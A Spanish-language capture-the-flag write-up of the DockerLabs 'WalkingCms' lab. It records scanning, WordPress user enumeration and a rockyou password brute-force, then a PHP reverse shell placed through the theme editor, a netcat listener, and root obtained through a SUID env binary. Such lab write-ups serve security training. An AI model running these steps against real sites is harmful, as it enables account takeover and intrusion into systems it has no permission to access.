---
title: WalkingCms Writeup - DockerLabs
date: 2024-08-09
categories: [WriteUps, DockerLabs]
tags: [Linux, Easy, DockerLabs]
img_path: /assets/img/dck/walking_cms/
image: /assets/img/dck/walking_cms/walking_cms.png
---

## Reconocimiento

Empezamos realizando un escaneo a la máquina objetivo con nmap, para ver que puertos tiene abiertos.

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
_______________________________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

---
Tiene abierto el puerto 80, ahora procedemos a lanzar un conjunto de script básicos  y a verificar su versión.

```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
_______________________________________________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```

## Enumeración

---
Está corriendo el servicio de Apache, y no vemos nada más que sea relevante. Así que aplicaremos Fuzzing con Gobuster para descubrir directorios y archivos.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php,html,txt,sh
_______________________________________________________________________
/index.html           (Status: 200) [Size: 10701]
/wordpress            (Status: 301) [Size: 312]
/server-status        (Status: 403) [Size: 275]
```
---
Gobuster nos reporto el directorio /wordpress, así que entramos a la página y de primera vista no notamos nada interesante.

![walking_cms-1](/assets/img/dck/walking_cms/walking_cms-1.png)

---
Como se trata de un WordPress, utilizaremos WPScan para enumerar usuarios válidos y plugins instalados junto con sus versiones.
```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp 
_______________________________________________________________________
[i] User(s) Identified:

[+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

## Explotación

---
Nos encontró al usuario mario, y podemos aprovechar la herramienta de WPScan para realizar un ataque de fuerza bruta.

```bash
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________________
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love
Trying mario / badboy Time: 00:00:04 <

[!] Valid Combinations Found:
 | Username: mario, Password: love
```
---
Obtenemos la contraseña del usuario mario, pero debemos conocer el panel de login, así que volvemos a hacer fuzzing con gobuster al directorio de wordpress.

```bash
gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html
_______________________________________________________________________
/wp-content           (Status: 301) [Size: 323]
/wp-login.php         (Status: 200) [Size: 6580]
/wp-includes          (Status: 301) [Size: 324]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 321]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0]
```
---
Nos dirigimos a la página web, en el directorio /wordpress/wp-admin y utilizamos las credenciales para loguearnos.

![walking_cms-2](/assets/img/dck/walking_cms/walking_cms-2.png)

---
Tenemos acceso al panel de wordpress como administrador, así que nos dirigimos a Theme Editor para modificar el index.php.

![walking_cms-3](/assets/img/dck/walking_cms/walking_cms-3.png)

---
Reemplazamos todo lo que aparece, por una Reverse Shell en PHP de Pentestmonkey, especificando nuestra IP de atacante y el puerto. Y le damos a Update File.

![walking_cms-4](/assets/img/dck/walking_cms/walking_cms-4.png)

---
Nos ponemos en escucha en el puerto 443, ya que ese fue el puerto que especificamos.

```bash
nc -lvnp 443
_______________________________________________________________________
listening on [any] 443 ...
```

Luego nos dirigimos al navegador y entramos a esta página donde fue que modificamos para tener una Reverse Shell.

```css
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php
```

---
Logramos obtener acceso a la máquina objetivo.

```bash
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 45834
Linux 48e833747d49 6.8.11-amd64
 05:36:34 up  1:51,  0 user,  load average: 0.93, 0.63, 0.50
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
_______________________________________________________________________
www-data@48e833747d49:/$
```

Ahora haremos un Tratamiento de la TTY para poder trabajar cómodamente por la consola.

```bash
script /dev/null -c bash
# Presionamos "Control + Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 41 columns 183
```

## Escalada de Privilegios

---
Ahora si vamos con la escalada de privilegios. Buscamos binarios con permisos SUID.

```bash
www-data@48e833747d49:/$ find / -perm -4000 2>/dev/null | xargs ls -l
_______________________________________________________________________
-rwsr-xr-x 1 root root 62672 Mar 23  2023 /usr/bin/chfn
-rwsr-xr-x 1 root root 52880 Mar 23  2023 /usr/bin/chsh
-rwsr-xr-x 1 root root 48536 Sep 20  2022 /usr/bin/env
-rwsr-xr-x 1 root root 88496 Mar 23  2023 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 59704 Mar 23  2023 /usr/bin/mount
-rwsr-xr-x 1 root root 48896 Mar 23  2023 /usr/bin/newgrp
-rwsr-xr-x 1 root root 68248 Mar 23  2023 /usr/bin/passwd
-rwsr-xr-x 1 root root 72000 Mar 23  2023 /usr/bin/su
-rwsr-xr-x 1 root root 35128 Mar 23  2023 /usr/bin/umount
```

---
Vemos que el binario /usr/bin/env tiene permisos SUID, y podemos utilizarlo con ayuda de GTFOBins para obtener una shell como root y logramos terminar la máquina.

```bash
www-data@48e833747d49:/$ ./usr/bin/env /bin/bash -p
bash-5.2# whoami
_______________________________________________________________________
root
```
